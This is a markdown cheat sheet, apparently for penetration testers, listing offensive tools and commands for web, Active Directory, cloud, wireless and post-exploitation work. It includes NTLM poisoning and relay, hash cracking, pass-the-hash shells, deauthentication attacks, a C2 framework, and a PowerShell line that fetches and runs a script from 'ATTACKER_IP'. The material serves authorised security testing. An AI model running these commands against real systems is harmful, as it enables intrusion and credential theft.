---
category: technique
title: "Extended Tool Reference - Web, AD, Cloud, Post-Exploitation, Binary"
tags: [tools, pentest, redteam, web, ad, cloud, post-exploitation, wireless, binary]
---

# Extended Tool Reference

## Web

**Burp Suite** - intercept, modify, replay. The proxy everything else runs through.
Configure browser to 127.0.0.1:8080. Community is free, Pro adds active scanner and Collaborator.

**Caido** - same concept as Burp but faster UI, good for team work where you share session state.

**commix**

```bash
pip install commix
commix --url="https://example.com/page?ip=127.0.0.1"
commix -r request.txt
```

**JWT-Tool**

```bash
pip install jwt-tool
jwt_tool <token> -M at        # run every attack automatically
jwt_tool <token> -X a         # alg:none specifically
jwt_tool <token> -S hs256 -k secret    # sign with known secret
```

**GraphQL**

```bash
pip install graphql-cop inql
graphql-cop -t https://example.com/graphql     # security audit
inql -t https://example.com/graphql            # introspection + mutations
```

**Interactsh** - blind injection callbacks, free Burp Collaborator replacement:

```bash
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client
```

## OSINT

**theHarvester** - emails, subdomains, employee names:

```bash
theHarvester -d example.com -b google,linkedin,shodan -l 500
```

**spiderfoot** - correlates 200+ sources into a graph, finds connections you'd miss:

```bash
pip install spiderfoot
sfcli -s example.com -t INTERNET_NAME,IP_ADDRESS,EMAILADDR
```

**Shodan + Censys** - find exposed infrastructure:

```bash
pip install shodan && shodan init <api-key>
shodan search 'org:"Example Corp"'
shodan search 'ssl.cert.subject.CN:example.com'
shodan host 1.2.3.4

pip install censys
censys search "example.com" --index-type hosts
```

## Active Directory

**BloodHound** - maps attack paths to Domain Admin. Run this on every AD engagement.

```bash
pip install bloodhound
bloodhound-python -u user -p pass -d domain.local -c all -dc 10.0.0.1
# then import the .zip into BloodHound CE:
docker run -p7474:7474 -p7687:7687 specterops/bloodhound
```

**Responder** - LLMNR/NBT-NS poisoning, captures NTLMv2 hashes passively:

```bash
sudo responder -I eth0 -wF
hashcat -m 5600 hashes.txt rockyou.txt
```

**mitm6 + ntlmrelayx** - IPv6 DNS poisoning → relay without cracking:

```bash
pip install mitm6
sudo mitm6 -d domain.local &
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -t ldap://dc.domain.local -smb2support --escalate-user lowpriv
```

**evil-winrm** - WinRM shell with upload/download built in:

```bash
gem install evil-winrm
evil-winrm -i 10.0.0.1 -u administrator -p 'Password123!'
evil-winrm -i 10.0.0.1 -u administrator -H <ntlmhash>
```

**Certipy** - AD Certificate Services attacks (ESC1-8):

```bash
pip install certipy-ad
certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1 -vulnerable
certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template 'VulnTemplate'
certipy auth -pfx user.pfx -dc-ip 10.0.0.1
```

## Cloud

**Prowler** - CIS/NIST compliance across AWS/Azure/GCP:

```bash
pip install prowler
prowler aws && prowler azure --az-cli-auth
```

**ScoutSuite** - better HTML reports, good for client deliverables:

```bash
pip install scoutsuite
scout aws && scout azure --cli
```

**Pacu** - AWS exploitation framework:

```bash
pip install pacu
# > set_keys
# > run iam__enum_users_roles_policies_groups
# > run s3__bucket_finder
```

**CloudFox** - finds exploitable attack paths in configs:

```bash
go install github.com/BishopFox/cloudfox@latest
cloudfox aws --profile default all-checks
```

## Post-exploitation

**LinPEAS / WinPEAS** - run immediately on any new shell:

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Windows: iex(new-object net.webclient).downloadstring('http://ATTACKER_IP/winpeas.ps1')
```

**pwncat** - reverse shell handler that auto-upgrades TTY and handles file transfer:

```bash
pip install pwncat-cs
pwncat-cs -lp 4444
```

**Empire / Starkiller** - PowerShell C2:

```bash
docker run -it bc-security/empire
```

## Network

**tshark**

```bash
tshark -i eth0 -w capture.pcap
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | sort -u
```

## Wireless

```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon   # deauth to force handshake
aircrack-ng capture-01.cap -w rockyou.txt
# or: convert first and use hashcat (-m 22000) for GPU speed
hcxtools -o capture.hc22000 capture-01.cap
hashcat -m 22000 capture.hc22000 rockyou.txt
```

## Binary exploitation

```bash
pip install gef                    # best GDB extension
echo "source $(pip show gef | grep Location | cut -d' ' -f2)/gef.py" >> ~/.gdbinit

pip install ropgadget pwntools
ROPgadget --binary ./target --rop | grep "pop rdi"

gem install one_gadget
one_gadget /lib/x86_64-linux-gnu/libc.so.6
```

## Utility

CyberChef for anything encoding/decoding related: https://gchq.github.io/CyberChef/ or `docker run -p 8080:80 mpepping/cyberchef`
